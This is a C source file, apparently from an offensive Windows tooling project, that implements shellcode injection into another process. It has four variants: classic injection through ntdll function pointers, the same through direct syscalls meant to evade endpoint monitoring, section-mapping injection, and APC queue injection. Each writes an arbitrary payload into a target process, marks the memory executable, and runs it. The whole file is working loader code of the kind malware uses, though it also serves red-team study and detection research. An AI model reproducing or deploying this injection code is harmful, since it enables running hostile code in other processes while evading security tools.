#include <../include/syscall.h>


BOOL ClassicInjectionViaNTdll(IN HANDLE hProcess, IN PVOID pPayload, IN SIZE_T sPayloadSize) {
	Syscall		St = { 0 };
	NTSTATUS	STATUS = 0x00;
	PVOID		pAddress = NULL;
	ULONG		uOldProtection = NULL;

	SIZE_T		sSize = sPayloadSize,
		sNumberOfBytesWritten = NULL;
	HANDLE		hThread = NULL;

	// initializing the 'St' structure to fetch the syscall's addresses
	if (!InitializeSyscallStruct(&St)) {
		printf("[!] Could Not Initialize The Syscall Struct \n");
		return FALSE;
	}

	//--------------------------------------------------------------------------

		// allocating memory 
	if ((STATUS = St.pNtAllocateVirtualMemory(hProcess, &pAddress, 0, &sSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE)) != 0) {
		printf("[!] NtAllocateVirtualMemory Failed With Error : 0x%0.8X \n", STATUS);
		return FALSE;
	}

	printf("[+] Allocated Address At : 0x%p Of Size : %d \n", pAddress, sSize);
	printf("[#] Press <Enter> To Write The Payload ... ");

	//--------------------------------------------------------------------------

		// writing the payload
	printf("\t[i] Writing Payload Of Size %d ... ", sPayloadSize);
	if ((STATUS = St.pNtWriteVirtualMemory(hProcess, pAddress, pPayload, sPayloadSize, &sNumberOfBytesWritten)) != 0 || sNumberOfBytesWritten != sPayloadSize) {
		printf("[!] pNtWriteVirtualMemory Failed With Error : 0x%0.8X \n", STATUS);
		printf("[i] Bytes Written : %d of %d \n", sNumberOfBytesWritten, sPayloadSize);
		return FALSE;
	}
	printf("[+] DONE \n");

	//--------------------------------------------------------------------------

		// changing the memory's permissions to RWX
	if ((STATUS = St.pNtProtectVirtualMemory(hProcess, &pAddress, &sPayloadSize, PAGE_EXECUTE_READWRITE, &uOldProtection)) != 0) {
		printf("[!] NtProtectVirtualMemory Failed With Error : 0x%0.8X \n", STATUS);
		return FALSE;
	}

	//--------------------------------------------------------------------------
		// executing the payload via thread 
	printf("[#] Press <Enter> To Run The Payload ... ");
	printf("\t[i] Running Thread Of Entry 0x%p ... ", pAddress);
	if ((STATUS = St.pNtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, pAddress, NULL, NULL, NULL, NULL, NULL, NULL)) != 0) {
		printf("[!] NtCreateThreadEx Failed With Error : 0x%0.8X \n", STATUS);
		return FALSE;
	}

	printf("[+] DONE \n");
	printf("\t[+] Thread Created With Id : %d \n", GetThreadId(hThread));

	return TRUE;
}

BOOL ClassicInjectionViaSyscalls(IN HANDLE hProcess, IN PVOID pPayload, IN SIZE_T sPayloadSize) {
	NTSTATUS	STATUS = 0x00;
	PVOID		pAddress = NULL;
	ULONG		uOldProtection = NULL;

	SIZE_T		sSize = sPayloadSize,
		sNumberOfBytesWritten = NULL;
	HANDLE		hThread = NULL;


	// allocating memory 
	if ((STATUS = Sw3NtAllocateVirtualMemory(hProcess, &pAddress, 0, &sSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE)) != 0) {
		printf("[!] NtAllocateVirtualMemory Failed With Error : 0x%0.8X \n", STATUS);
		return FALSE;
	}
	printf("[+] Allocated Address At : 0x%p Of Size : %d \n", pAddress, sSize);
	printf("[#] Press <Enter> To Write The Payload ... ");

	//--------------------------------------------------------------------------
		// writing the payload
	printf("\t[i] Writing Payload Of Size %d ... ", sPayloadSize);
	if ((STATUS = Sw3NtWriteVirtualMemory(hProcess, pAddress, pPayload, sPayloadSize, &sNumberOfBytesWritten)) != 0 || sNumberOfBytesWritten != sPayloadSize) {
		printf("[!] pNtWriteVirtualMemory Failed With Error : 0x%0.8X \n", STATUS);
		printf("[i] Bytes Written : %d of %d \n", sNumberOfBytesWritten, sPayloadSize);
		return FALSE;
	}
	printf("[+] DONE \n");

	//--------------------------------------------------------------------------
		// changing the memory's permissions to RWX
	if ((STATUS = Sw3NtProtectVirtualMemory(hProcess, &pAddress, &sPayloadSize, PAGE_EXECUTE_READWRITE, &uOldProtection)) != 0) {
		printf("[!] NtProtectVirtualMemory Failed With Error : 0x%0.8X \n", STATUS);
		return FALSE;
	}

	//--------------------------------------------------------------------------
		// executing the payload via thread 
	printf("[#] Press <Enter> To Run The Payload ... ");
	printf("\t[i] Running Thread Of Entry 0x%p ... ", pAddress);
	if ((STATUS = Sw3NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, pAddress, NULL, NULL, NULL, NULL, NULL, NULL)) != 0) {
		printf("[!] NtCreateThreadEx Failed With Error : 0x%0.8X \n", STATUS);
		return FALSE;
	}
	printf("[+] DONE \n");
	printf("\t[+] Thread Created With Id : %d \n", GetThreadId(hThread));

	return TRUE;
}

BOOL MappingInjectionViaSyscalls(IN HANDLE hProcess, IN PVOID pPayload, IN SIZE_T sPayloadSize) {
	HANDLE				hSection = NULL;
	HANDLE				hThread = NULL;
	PVOID				pLocalAddress = NULL,
		pRemoteAddress = NULL;
	NTSTATUS			STATUS = NULL;
	SIZE_T				sViewSize = NULL;
	LARGE_INTEGER		MaximumSize = {
			.HighPart = 0,
			.LowPart = sPayloadSize
	};

	if ((STATUS = Sw3NtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, &MaximumSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL)) != 0) {
		printf("[!] NtCreateSection Failed With Error : 0x%0.8X \n", STATUS);
		return FALSE;
	}

	if ((STATUS = Sw3NtMapViewOfSection(hSection, (HANDLE)-1, &pLocalAddress, NULL, NULL, NULL, &sViewSize, ViewShare, NULL, PAGE_EXECUTE_READWRITE)) != 0) {
		printf("[!] NtMapViewOfSection [L] Failed With Error : 0x%0.8X \n", STATUS);
		return FALSE;
	}

	printf("[+] Local Memory Allocated At : 0x%p Of Size : %d \n", pLocalAddress, sViewSize);

	//--------------------------------------------------------------------------

		// writing the payload
	printf("[#] Press <Enter> To Write The Payload ... ");
	getchar();
	memcpy(pLocalAddress, pPayload, sPayloadSize);
	printf("\t[+] Payload is Copied From 0x%p To 0x%p \n", pPayload, pLocalAddress);

	//--------------------------------------------------------------------------
	// allocating remote map view 
	if (hProcess != (HANDLE)-1) {
		if ((STATUS = Sw3NtMapViewOfSection(hSection, hProcess, &pRemoteAddress, NULL, NULL, NULL, &sViewSize, ViewShare, NULL, PAGE_EXECUTE_READWRITE)) != 0) {
			printf("[!] NtMapViewOfSection [R] Failed With Error : 0x%0.8X \n", STATUS);
			return FALSE;
		}

		printf("[+] Remote Memory Allocated At : 0x%p Of Size : %d \n", pRemoteAddress, sViewSize);

		pLocalAddress = pRemoteAddress;

	}

	//--------------------------------------------------------------------------

		// executing the payload via thread creation
	printf("[#] Press <Enter> To Run The Payload ... ");
	getchar();
	printf("\t[i] Running Thread Of Entry 0x%p ... ", pLocalAddress);
	if ((STATUS = Sw3NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, pLocalAddress, NULL, NULL, NULL, NULL, NULL, NULL)) != 0) {
		printf("[!] NtCreateThreadEx Failed With Error : 0x%0.8X \n", STATUS);
		return FALSE;
	}
	printf("[+] DONE \n");
	printf("\t[+] Thread Created With Id : %d \n", GetThreadId(hThread));
	//--------------------------------------------------------------------------

		// unmpaing the local view
		/*
		if ((STATUS = NtUnmapViewOfSection((HANDLE)-1, pLocalAddress)) != 0) {
			printf("[!] NtUnmapViewOfSection Failed With Error : 0x%0.8X \n", STATUS);
			return FALSE;
		}
		*/

		// closing the section handle
	if ((STATUS = Sw3NtClose(hSection)) != 0) {
		printf("[!] NtClose Failed With Error : 0x%0.8X \n", STATUS);
		return FALSE;
	}

	return TRUE;
}

BOOL ApcInjectionViaSyscalls(IN HANDLE hProcess, IN HANDLE hThread, IN PVOID pPayload, IN SIZE_T sPayloadSize) {


	NTSTATUS		STATUS = NULL;
	PVOID			pAddress = NULL;
	ULONG			uOldProtection = NULL;
	SIZE_T			sSize = sPayloadSize,
		sNumberOfBytesWritten = NULL;

	// allocating memory 
	if ((STATUS = Sw3NtAllocateVirtualMemory(hProcess, &pAddress, 0, &sSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE)) != 0) {
		printf("[!] NtAllocateVirtualMemory Failed With Error : 0x%0.8X \n", STATUS);
		return FALSE;
	}
	printf("[+] Allocated Address At : 0x%p Of Size : %d \n", pAddress, sSize);

	//--------------------------------------------------------------------------

		// writing the payload
	printf("[#] Press <Enter> To Write The Payload ... ");
	getchar();
	printf("\t[i] Writing Payload Of Size %d ... ", sPayloadSize);
	if ((STATUS = Sw3NtWriteVirtualMemory(hProcess, pAddress, pPayload, sPayloadSize, &sNumberOfBytesWritten)) != 0 || sNumberOfBytesWritten != sPayloadSize) {
		printf("[!] pNtWriteVirtualMemory Failed With Error : 0x%0.8X \n", STATUS);
		printf("[i] Bytes Written : %d of %d \n", sNumberOfBytesWritten, sPayloadSize);
		return FALSE;
	}
	printf("[+] DONE \n");


	//--------------------------------------------------------------------------

		// changing the memory's permissions to RWX
	if ((STATUS = Sw3NtProtectVirtualMemory(hProcess, &pAddress, &sPayloadSize, PAGE_EXECUTE_READWRITE, &uOldProtection)) != 0) {
		printf("[!] NtProtectVirtualMemory Failed With Error : 0x%0.8X \n", STATUS);
		return FALSE;
	}

	//--------------------------------------------------------------------------

		// executing the payload via NtQueueApcThread

	printf("[#] Press <Enter> To Run The Payload ... ");
	getchar();
	printf("\t[i] Running Payload At 0x%p Using Thread Of Id : %d ... ", pAddress, GetThreadId(hThread));
	if ((STATUS = Sw3NtQueueApcThread(hThread, pAddress, NULL, NULL, NULL)) != 0) {
		printf("[!] NtQueueApcThread Failed With Error : 0x%0.8X \n", STATUS);
		return FALSE;
	}
	printf("[+] DONE \n");

	return TRUE;
}

// a function to set the calling thread in alertable state
VOID AlterableFunction() {

	HANDLE	hEvent = CreateEvent(
		NULL,
		NULL,
		NULL,
		NULL
	);

	MsgWaitForMultipleObjectsEx(
		1,
		&hEvent,
		INFINITE,
		QS_HOTKEY,
		MWMO_ALERTABLE
	);

}

// Helpers 
BOOL InitializeSyscallStruct(OUT PSyscall St) {

	HMODULE		hNtdll = GetModuleHandle(L"NTDLL.DLL");
	if (!hNtdll) {
		printf("[!] GetModuleHandle Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
	St->pNtAllocateVirtualMemory = (fnNtAllocateVirtualMemory)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
	St->pNtProtectVirtualMemory = (fnNtProtectVirtualMemory)GetProcAddress(hNtdll, "NtProtectVirtualMemory");
	St->pNtWriteVirtualMemory = (fnNtWriteVirtualMemory)GetProcAddress(hNtdll, "NtWriteVirtualMemory");
	St->pNtCreateThreadEx = (fnNtCreateThreadEx)GetProcAddress(hNtdll, "NtCreateThreadEx");

	if (St->pNtAllocateVirtualMemory == NULL || St->pNtProtectVirtualMemory == NULL || St->pNtWriteVirtualMemory == NULL || St->pNtCreateThreadEx == NULL)
		return FALSE;
	else
		return TRUE;
}